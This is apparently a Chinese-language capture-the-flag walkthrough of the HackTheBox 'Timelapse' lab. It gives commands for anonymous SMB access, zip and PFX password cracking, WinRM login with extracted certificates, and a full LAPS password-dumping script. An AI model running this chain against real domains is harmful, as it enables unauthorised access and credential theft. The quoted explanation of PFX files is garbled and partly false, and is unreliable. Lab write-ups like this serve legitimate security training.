---
title: Timelapse
date: 2022-04-02 20:24:09
tags: HackThebox
categories: 内网渗透
---

## 信息收集
做信息收集的时候，发现是一台内网靶机，开放了很多内网相关的端口。我们也发现了一个域名`timelapse.htb`，我们可以添加到hosts文件中
![在这里插入图片描述](https://img-blog.csdnimg.cn/b363e71b5b4c4883a978e38380b664a1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
目标开放了SMB服务，我们尝试是否可以匿名登录SMB服务。发现可以匿名登录，`Shares`目录可以进行读取

```bash
smbmap -u guest -p "" -H 10.10.11.152
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/3da8a600e7134088a39b0b6a69d30061.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

<!--more-->

然后我们尝试匿名登录到这个目录上，看到存在一个备份文件压缩包。我们将其下载下来进行进一步分析

```bash
smbclient \\\\10.10.11.152\\Shares -U guest
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/3c22cf39fa7c4d559bb37663f1be6e5a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
## 漏洞利用
我们下载下来后尝试解压，发现需要密码，我们将其哈希提取出来，并进行密码爆破

```bash
zip2john winrm_backup.zip > hash
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/cfc92e6c1b744cc6a860bedcd77d9270.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

<!--more-->

发现密码是`supremelegacy`

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/f852f3e5c3154f75bd511daacb55cf01.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
解压出来发现是一个pfx格式的文件
![在这里插入图片描述](https://img-blog.csdnimg.cn/efab625b6c944696b66c0055cff99376.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
这是关于pfx文件的具体解释

> **文件的扩展名PFX的系统文件，以嵌入到它的加密安全功能特别文件。这些的加密安全功能的.pfx文件包括用来参与确定身份验证过程数字证书的用户或设备都可以访问某些文件，系统本身或者计算机连接的是那些具有管理员权限的网络是否。这些PFX文件需要密码就可以使用Adobe Acrobat X或Adobe Reader中打开之前。这意味着这些PFX文件是保护或保护用户免受黑客，第三方用户的计算机和网络，而无需访问系统和网络资源的同意有益的以及恶意应用程序，指示它来访问这些受保护的资源和数据的代码。 PFX文件可能在Mac和Microsoft Windows系统中找到，并且可用于打开这些应用程序的.pfx文件是使用Adobe Acrobat X和Adobe Reader与Mac或Microsoft Windows环境兼容的版本。**

因为pfx文件是经过数字签名加密的，我们可以使用`openssl`命令进行分析，这里我们同时使用pkcs12文件工具，能生成和分析pkcs12文件。PKCS#12文件可以被用于多个项目，例如包含Netscape、 MSIE 和 MS Outlook。但是我们使用之前破解的密码时发现并不能使用

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out prv.key
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/563b8033165244268dec20bb300f0b29.png)
此时我们需要使用另一个工具`pfx2john`对该pfx文件的哈希进行导出

```bash
pfx2john legacyy_dev_auth.pfx > pfx_hash
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/0a6b4aaef994435a88bf2cc0150d7b10.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
破解得到密码为`thuglegacy`，记住这个密码，后面我们还需要频繁使用
![在这里插入图片描述](https://img-blog.csdnimg.cn/b40e418cf14b492680a75b297abc97b7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们输入这个破解的密码，得到私钥文件
![在这里插入图片描述](https://img-blog.csdnimg.cn/0dcc546c60134758a20902dbaadd454c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
然后我们还必须得得到一个证书文件才能用于登录

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/86fb631c369e41b189fa2f6b7f21524b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
因为前面信息收集时发现目标主机开放了5986的`WinRM`端口，这是用于横向渗透的端口，我们可以使用`evil-winrm`工具进行连接。`-S`参数是指ssl参数连接，`-c`是充当公钥，`-k`是私钥，`-p和-u`分别是用户名和密码

```bash
evil-winrm -i 10.10.11.152 -S -c cert.crt -k prv.key -p -u
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/54bb44dfa52349acb27153a40dab0417.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
## 提权到Administrator
我们上传一个`winPEASx64.exe`程序查看可提权的项
![在这里插入图片描述](https://img-blog.csdnimg.cn/81ce1cddc1b4435fb5ea1b0622e4937a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们看到存在一个powershell的历史文件
![在这里插入图片描述](https://img-blog.csdnimg.cn/d6a93b246b6a4879afd98bce7f6d691b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们可以尝试下载看看其内容
![在这里插入图片描述](https://img-blog.csdnimg.cn/0db888c948ee40d99eced4e164122e39.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
查看文件内容时，发现里面存在一个用户名`svc_deploy`和密码`E3R$Q62^12p7PLlC%KWaxuaV`
![在这里插入图片描述](https://img-blog.csdnimg.cn/f06f173fb7b84cad8e0128a1f526acf3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们可以使用`laps.py`脚本，对域的计算机的本地帐户密码进行导出

```python
#!/usr/bin/env python3
from ldap3 import ALL, Server, Connection, NTLM, extend, SUBTREE
import argparse

parser = argparse.ArgumentParser(description='Dump LAPS Passwords')
parser.add_argument('-u','--username',  help='username for LDAP', required=True)
parser.add_argument('-p','--password',  help='password for LDAP (or LM:NT hash)',required=True)
parser.add_argument('-l','--ldapserver', help='LDAP server (or domain)', required=False)
parser.add_argument('-d','--domain', help='Domain', required=True)

def base_creator(domain):
    search_base = ""
    base = domain.split(".")
    for b in base:
        search_base += "DC=" + b + ","
    return search_base[:-1]


def main():
    args = parser.parse_args()
    if args.ldapserver:
        s = Server(args.ldapserver, get_info=ALL)
    else:
        s = Server(args.domain, get_info=ALL)
    c = Connection(s, user=args.domain + "\\" + args.username, password=args.password, authentication=NTLM, auto_bind=True)
    c.search(search_base=base_creator(args.domain), search_filter='(&(objectCategory=computer)(ms-MCS-AdmPwd=*))',attributes=['ms-MCS-AdmPwd','SAMAccountname'])
    for entry in c.entries:
        print (str(entry['sAMAccountName']) +":"+ str(entry['ms-Mcs-AdmPwd']))

if __name__ == "__main__":
    main()
```
最后我们得到管理员的密码
![在这里插入图片描述](https://img-blog.csdnimg.cn/3aa6b20e2af44dba8c4be112c645a7f1.png)
成功获取到管理员权限
![在这里插入图片描述](https://img-blog.csdnimg.cn/2f56e2e08f17496cb47d7f12709542a9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
